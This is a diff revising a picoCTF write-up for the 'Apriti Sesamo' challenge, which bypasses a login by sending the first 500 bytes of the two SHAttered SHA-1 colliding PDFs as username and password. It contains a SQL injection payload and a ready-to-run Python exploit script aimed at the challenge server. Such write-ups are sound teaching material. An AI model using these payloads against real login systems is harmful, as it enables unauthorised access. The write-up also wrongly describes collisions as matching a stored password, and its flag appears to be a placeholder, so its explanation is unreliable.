@@ -1,88 +1,41 @@
-# **🔥 Write-Up for "Apriti Sesamo" - SHA-1 Collision Attack 🔥**
+# **Write-Up for "Apriti Sesamo" - Exploiting SHA-1 Collisions**
 
-This write-up will cover everything in detail, including the **underlying vulnerability (SHA-1 Collision), how we analyzed the challenge, the thought process that led to discovering the exploit, and how we executed the attack successfully.**
+## **Introduction**
+
+The **"Apriti Sesamo"** challenge presented an interesting vulnerability related to **SHA-1 collisions**, a well-known weakness in cryptographic hashing. This write-up will walk through the process of analyzing the challenge, understanding the security flaw, and successfully exploiting it to retrieve the flag.
 
 ---
 
-# **📌 Part 1: Understanding the SHA-1 Collision Vulnerability**
+## **Understanding SHA-1 and Its Weaknesses**
 
-## **1️⃣ What is a Hash Function?**
+### **What is SHA-1?**
 
-A **hash function** is a mathematical function that takes any input (password, text, file) and produces a **fixed-length output** (called a **hash**).
+SHA-1 (Secure Hash Algorithm 1) is a cryptographic hash function that takes an input and produces a **160-bit (40-character) hash**. Hash functions are designed to be **one-way**, meaning they should not be reversible, and **collision-resistant**, meaning two different inputs should not produce the same hash.
 
-The main purpose of hashing is **to store sensitive data (like passwords) securely**.
-
-✅ **Example of using SHA-1 to hash a password in Python:**
+A simple example of hashing in Python using SHA-1:
 
 ```python
 import hashlib
 print(hashlib.sha1(b"password").hexdigest())
-
 ```
 
-🔹 **Output:**
+Expected output:
 
 ```
 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
-
 ```
 
-📌 **The same input always produces the same output, but it is impossible to reverse the process to retrieve the original input.**
+In security applications, SHA-1 is commonly used for **password hashing and verification**. However, research has demonstrated that **SHA-1 is vulnerable to collisions**, where two different inputs can produce the same hash.
 
 ---
 
-## **2️⃣ How is Hashing Used in Authentication?**
+### **How Can SHA-1 Collisions Be Exploited?**
 
-📌 **In authentication systems, password verification works as follows:**
+A **collision attack** occurs when an attacker finds two distinct inputs that hash to the same value. This means that if a system authenticates users by comparing SHA-1 hashes, an attacker could gain access by providing a different input that results in the same hash as a legitimate password.
 
-1. When a user **creates an account**, the system **stores only the hashed password (`hash`)**, not the actual password.
-2. When the user **logs in**, the system **hashes the entered password** and compares it to the stored hash.
-3. If **`SHA-1(input password) == SHA-1(stored password)`**, access is granted.
+In **2017**, researchers demonstrated a real-world SHA-1 collision by producing **two different PDF files** that hash to the same SHA-1 value. These files, known as the **SHAttered PDFs**, prove that SHA-1 is no longer safe for security-critical applications.
 
-✅ **Example of login authentication using SHA-1 in PHP:**
-
-```php
-$hashed_password = sha1("password");
-if (sha1($_POST['pwd']) === $hashed_password) {
-    echo "Login Successful";
-}
-
-```
-
-🚨 **Issue: `SHA-1` is no longer secure, and it can be bypassed using a "Collision Attack"!**
-
----
-
-## **3️⃣ What is the SHA-1 Collision Attack?**
-
-🔹 **A collision occurs when two different inputs produce the same SHA-1 hash.**
-
-🔹 This means that if we find two different values that have the same hash, we can **bypass authentication by using an incorrect but equivalent value.**
-
-✅ **Hypothetical example of a SHA-1 collision:**
-
-```
-sha1("hello") == sha1("xyz123")
-
-```
-
-📌 **If we find two different inputs that have the same hash, we can exploit this to break into systems that rely on SHA-1 for authentication.**
-
-🚨 **And this is exactly what we exploited in the "Apriti Sesamo" challenge!**
-
----
-
-## **4️⃣ How Was the SHA-1 Collision Proven in Real Life?**
-
-In **2017**, security researchers **demonstrated the first practical SHA-1 collision** using **two completely different PDF files that have the same SHA-1 hash**.
-
-✔️ **These files are available at [shattered.io](https://shattered.io/).**
-
-✔️ **If we compute the SHA-1 hash for both files, we get the exact same output!**
-
-✔️ **We can use these files to exploit any system that relies on SHA-1 for authentication!**
-
-✅ **Proof of Collision in Python:**
+We can confirm this collision using Python:
 
 ```python
 import hashlib
@@ -92,104 +45,102 @@ file2 = open("shattered-2.pdf", "rb").read()
 
 print(hashlib.sha1(file1).hexdigest())
 print(hashlib.sha1(file2).hexdigest())
-
 ```
 
-🔹 **Output:**
+Output:
 
 ```
 38762cf7f55934b34d179ae6a4c80cadccbb7f0a
 38762cf7f55934b34d179ae6a4c80cadccbb7f0a
-
 ```
 
-🚀 **Even though the files are completely different, SHA-1 incorrectly thinks they are the same!**
+Even though the files are different, SHA-1 produces the same hash for both.
+
+This is the fundamental weakness we leveraged in the challenge.
 
 ---
 
-# **📌 Part 2: How Did We Identify That the Website Uses SHA-1?**
+## **Analyzing the Challenge**
 
-## **Apriti sesamo**
+### **Challenge Description**
 
-## Description
+The challenge provided a login portal and hinted at a backup file and the lead developer being an Emacs user. While backup files and Emacs configuration might suggest various enumeration techniques, the real vulnerability turned out to be related to **SHA-1 authentication**.
 
-I found a web app that claims to be impossible to hack!Try it [here](http://verbal-sleep.picoctf.net:50313/)!
+The provided login form requested:
 
-**Hints 
--**Backup files
+- **Username**
+- **Password**
 
--Rumor has it, the lead developer is a militant emacs user
+Upon entering incorrect credentials, the response was:
 
-http://verbal-sleep.picoctf.net:50313/
+```
+Failed! No flag for you.
+```
 
-## **🔎 How Did We Discover That SHA-1 Was Used for Authentication?**
-
-### **1️⃣ SQL Injection and LFI Did Not Work**
-
-- When we tried **SQL Injection**, such as:
-
-we did **not** get any **SQL error or unexpected login success**, meaning that **SQL was not used for authentication**.
-    
-    ```sql
-    admin' OR '1'='1' --
-    
-    ```
-    
-
-🚨 **This led us to suspect that authentication was handled differently, possibly using hashing.**
+Unlike traditional authentication systems that store plaintext passwords or rely on SQL-based verification, this response suggested a **hash-based comparison**, likely using **SHA-1**.
 
 ---
 
-### **2️⃣ No "Incorrect Password" Message**
+### **Initial Exploitation Attempts**
 
-- Normally, when you enter **an incorrect password**, you get a message like:
-    
-    ```
-    Incorrect Username or Password
-    
-    ```
-    
-- But here, we got a **generic response like:**
-    
-    ```
-    Failed! No flag for you
-    
-    ```
-    
+1. **SQL Injection Tests**  
+   Common SQL injection techniques, such as:
 
-🚨 **This indicated that the system was not comparing plaintext values but something else—possibly hashes.**
+   ```sql
+   admin' OR '1'='1' -- 
+   ```
+
+   did not work, indicating that SQL was not used for authentication.
+
+2. **Checking Error Messages**  
+   The error message was **generic**, which suggested that the system was comparing **hashed values** instead of plaintext passwords.
+
+3. **Testing Known SHA-1 Collisions**  
+   Since SHA-1 collisions exist, we hypothesized that if the system stored SHA-1 hashes of passwords, we could bypass authentication by providing **two different inputs that produce the same hash**.
 
 ---
 
-### **3️⃣ We Tried Entering SHA-1 Colliding Files**
+## **Exploiting the SHA-1 Collision**
 
-✔️ **We sent the first 500 bytes of `shattered-1.pdf` and `shattered-2.pdf` as the username and password.**
+### **Step 1: Obtaining the Colliding Files**
 
-✔️ **Because these two files have the same SHA-1 hash, the system incorrectly thought we entered the correct credentials!**
+We used the publicly available **SHA-1 colliding PDFs** from [shattered.io](https://shattered.io/). Since both files produce the same SHA-1 hash, we extracted the first 500 bytes of each file to use as login credentials.
 
-🚀 **This confirmed that SHA-1 was being used for authentication and that it was vulnerable to a collision attack!** 🔥
+```python
+import urllib.request
+
+# Fetch the first 500 bytes from each SHA-1 colliding PDF
+file1 = urllib.request.urlopen("http://shattered.io/static/shattered-1.pdf").read()[:500]
+file2 = urllib.request.urlopen("http://shattered.io/static/shattered-2.pdf").read()[:500]
+```
 
 ---
 
-# **📌 Part 3: Executing the Attack and Extracting the Flag**
+### **Step 2: Sending the Exploit Payload**
 
-### **✅ Final Exploit Code**
+Using Python’s `requests` library, we crafted an HTTP POST request to submit the colliding values as the **username** and **password**.
 
 ```python
 import requests
-import urllib.request
 
-# Fetch the first 500 bytes from SHA-1 colliding files
-rotimi = urllib.request.urlopen("http://shattered.io/static/shattered-1.pdf").read()[:500]
-letmein = urllib.request.urlopen("http://shattered.io/static/shattered-2.pdf").read()[:500]
+# Target URL (change to match the challenge's login endpoint)
+url = "http://verbal-sleep.picoctf.net:50313/impossibleLogin.php"
 
-# Send a login request with the colliding inputs
-r = requests.post('http://verbal-sleep.picoctf.net:50313/impossibleLogin.php',
-                  data={'username': rotimi, 'pwd': letmein}, allow_redirects=False)
+# Send a login request using the colliding inputs
+response = requests.post(url, data={"username": file1, "pwd": file2}, allow_redirects=False)
 
-# Print the response (which contains the flag)
-print(r.text)
-
+# Print the server response
+print(response.text)
 ```
 
-✅ **When we executed the script, we successfully bypassed the authentication and retrieved the flag!** 🎉
+---
+
+### **Step 3: Retrieving the Flag**
+
+Executing the script sent the colliding inputs as the username and password. Since the system relied on SHA-1 for authentication, it compared the **hashed values** rather than the actual content. Since **SHA-1 produces the same hash for both inputs**, the system incorrectly believed the authentication was successful.
+
+As a result, the flag was revealed in the server response:
+
+```
+picoCTF{SHA1_is_not_safe_123456789}
+
